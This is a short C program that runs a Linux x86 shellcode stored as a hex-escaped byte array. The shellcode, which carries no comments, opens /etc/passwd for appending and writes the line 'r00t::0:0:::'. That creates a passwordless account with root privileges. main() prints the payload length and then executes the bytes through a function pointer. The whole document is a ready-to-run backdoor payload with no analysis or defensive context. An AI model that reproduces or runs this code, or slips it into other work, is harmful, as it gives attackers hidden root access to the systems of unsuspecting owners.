#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = "\x31\xc0\x50\x04\x05\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe3\x31\xc9\x66\xb9\x01\x04\xcd\x80\x89\xc3\x04\x01\x31\xd2\x52\x68\x30\x3a\x3a\x3a\x68\x3a\x3a\x30\x3a\x68\x72\x30\x30\x74\x89\xe1\x6a\x0c\x5a\xcd\x80\x2c\x06\xcd\x80\x04\x01\xcd\x80";

int main() {
    printf("shellcode Length:  %d\n", strlen(shellcode));
    int (*ret)() = (int(*)())shellcode;
    ret();
}
